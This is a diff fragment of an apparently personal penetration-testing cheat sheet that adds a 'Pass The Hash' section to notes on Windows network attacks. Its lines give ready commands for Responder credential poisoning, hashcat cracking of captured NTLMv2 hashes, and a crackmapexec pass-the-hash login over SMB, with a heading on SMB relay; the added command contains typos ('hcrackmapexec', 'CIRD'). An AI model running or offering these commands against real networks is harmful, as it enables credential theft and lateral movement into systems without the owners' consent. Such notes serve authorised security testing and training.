@@ -21,6 +21,10 @@ responder -I <interface> -rdw
 ```bash
 hashcat -m 5600 hash.txt /path/to/wordlist.txt
 ```
+#### Pass The Hash
+```bash
+hcrackmapexec smb IP-address/CIRD -U FirstName.LastName -H Hash-File --local
+```
 
 ### SMB Relay attack
 #### Make sure you turn off the SMB and HTTP from responder configuration
